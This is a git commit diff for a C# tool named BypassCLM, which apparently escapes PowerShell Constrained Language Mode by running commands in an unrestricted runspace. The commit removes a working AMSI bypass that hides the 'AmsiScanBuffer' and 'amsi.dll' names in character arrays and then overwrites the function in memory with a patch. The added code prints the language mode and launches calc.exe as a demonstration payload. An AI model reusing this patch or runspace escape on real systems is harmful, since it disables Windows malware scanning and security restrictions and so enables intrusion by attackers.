b3eeb1e7cac8c98744821eb4d6ae84871e1aa03e
unknown <shaifi.moazzem@gmail.com>
2023-02-21 20:28:56 +1100

    Modified version to print the language mode and execute calc.exe

--- BypassCLM/Program.cs
+++ BypassCLM/Program.cs
@@ -7,64 +7,37 @@ using System.Xml.Linq;
 
 namespace Bypass
 {
-    public class BypassCLM
+    class Program
     {
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
-
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-        static int Bypass()
-        {
-            char[] chars = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
-            String funcName = string.Join("", chars);
-
-            char[] chars2 = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
-            String libName = string.Join("", chars2);
-
-            IntPtr Address = GetProcAddress(LoadLibrary(libName), funcName);
-
-            UIntPtr size = (UIntPtr)5;
-            uint p = 0;
-
-            VirtualProtect(Address, size, 0x40, out p);
-            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-            Marshal.Copy(Patch, 0, Address, 6);
-
-            return 0;
-
-        }
-        public static void Main(String[] args)
+        static void Main(string[] args)
         {
             Runspace run = RunspaceFactory.CreateRunspace();
             run.Open();
 
-            Console.WriteLine(Bypass());
-
             PowerShell shell = PowerShell.Create();
             shell.Runspace = run;
 
-            String exec = "calc.exe";  // Modify for custom commands
+            String exec = "$ExecutionContext.SessionState.LanguageMode";
             shell.AddScript(exec);
-            shell.Invoke();
 
             Collection<PSObject> output = shell.Invoke();
-            foreach (PSObject o in output)
+            foreach (PSObject obj in output)
             {
-                Console.WriteLine(o.ToString());
+                Console.WriteLine(obj.ToString());
+            }
+            
+            Console.WriteLine("\nNice! Eexcuting Calculator now!");
+            
+            String exec1 = "calc.exe";
+            shell.AddScript(exec1);
+
+            Collection<PSObject> output1 = shell.Invoke();
+            foreach (PSObject obj in output1)
+            {
+                Console.WriteLine(obj.ToString());
             }
 
-            foreach (ErrorRecord err in shell.Streams.Error)
-            {
-                Console.Write("Error: " + err.ToString());
-            }
             run.Close();
-
         }
     }
-
 }
